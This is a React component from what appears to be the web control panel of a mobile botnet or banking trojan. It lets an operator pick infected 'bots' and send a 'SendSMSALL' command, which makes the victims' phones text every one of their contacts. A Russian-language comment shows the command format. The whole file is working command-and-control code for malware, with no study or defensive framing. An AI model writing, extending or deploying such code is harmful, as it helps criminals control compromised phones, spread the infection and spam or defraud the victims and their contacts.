import React from 'react';
import SettingsContext from '../../Settings';


//Отправка СМС - {"this":"~command~","name":"SendSMSALL","number":"+123456789","text":"hi bro!"}
class SendSMSALL extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          text: ''
        }
    }


    onChangeText = (e) => {
        this.setState({ 
            text: e.target.value
        });
    }

    onClickSendSMSALL = (e) => {
        if(SettingsContext.BotsSelected()) {
            if(this.state.text.length < 1) {
                SettingsContext.ShowToastTitle("warning", "SMS", "Please fill text");
            };
            SettingsContext.BotSendCommand('{"name":"SendSMSALL", "text":"' + this.state.text + '"}');
            this.setState({ 
                phone: '',
                text: ''
            });
            SettingsContext.ShowToastTitle("info", "SMS", "Please wait while the bots confirm the command");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Send sms to all contacts</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Send sms from selected bots</h6>
                    <p class="card-text">
                        <input class="margintop5px form-control" value={this.state.text} onChange={this.onChangeText} placeholder="SMS Text" />
                    </p>
                    <button type="button" onClick={this.onClickSendSMSALL} class="btn btn-right btn-outline-success">Send SMS to all</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default SendSMSALL;